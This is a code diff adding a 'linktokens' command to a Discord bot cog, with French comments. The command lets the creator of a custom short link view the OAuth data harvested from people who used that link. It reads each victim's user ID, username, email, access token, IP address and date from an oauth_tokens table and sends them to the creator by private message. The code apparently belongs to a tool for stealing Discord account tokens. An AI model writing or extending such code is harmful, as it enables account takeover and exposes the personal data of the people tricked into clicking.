@@ -402,5 +402,63 @@ class CreateLink(commands.Cog):
             )
             await ctx.send(embed=embed)
 
+@commands.command(name='linktokens')
+async def link_tokens(self, ctx, short_id: str):
+    """Affiche tous les tokens récupérés pour un lien"""
+    try:
+        conn = sqlite3.connect("links.db")
+        cursor = conn.cursor()
+        
+        # Vérifier que l'utilisateur est le créateur
+        cursor.execute('SELECT user_id FROM custom_links WHERE id = ?', (short_id,))
+        result = cursor.fetchone()
+        
+        if not result:
+            await ctx.send("❌ Lien non trouvé")
+            conn.close()
+            return
+        
+        if result[0] != ctx.author.id:
+            await ctx.send("❌ Vous n'êtes pas le créateur de ce lien")
+            conn.close()
+            return
+        
+        # Récupérer les tokens
+        cursor.execute('''
+            SELECT user_id, username, email, access_token, ip_address, created_at
+            FROM oauth_tokens
+            WHERE short_id = ?
+            ORDER BY created_at DESC
+        ''', (short_id,))
+        
+        tokens = cursor.fetchall()
+        conn.close()
+        
+        if not tokens:
+            await ctx.send("❌ Aucun token récupéré pour ce lien")
+            return
+        
+        embed = discord.Embed(
+            title=f"🔑 Tokens récupérés pour `{short_id}`",
+            description=f"**Total: {len(tokens)} token(s)**",
+            color=discord.Color.gold()
+        )
+        
+        for idx, (user_id, username, email, token, ip, created_at) in enumerate(tokens[:10], 1):
+            embed.add_field(
+                name=f"Token #{idx}",
+                value=f"**User:** {username} (`{user_id}`)\n**Email:** {email}\n**Token:** `{token[:30]}...`\n**IP:** `{ip}`\n**Date:** {created_at}",
+                inline=False
+            )
+        
+        if len(tokens) > 10:
+            embed.set_footer(text=f"Affichage des 10 premiers tokens sur {len(tokens)}")
+        
+        await ctx.author.send(embed=embed)
+        await ctx.send("✅ Liste des tokens envoyée en DM")
+        
+    except Exception as e:
+        await ctx.send(f"❌ Erreur: {str(e)}")
+
 async def setup(bot):
     await bot.add_cog(CreateLink(bot))
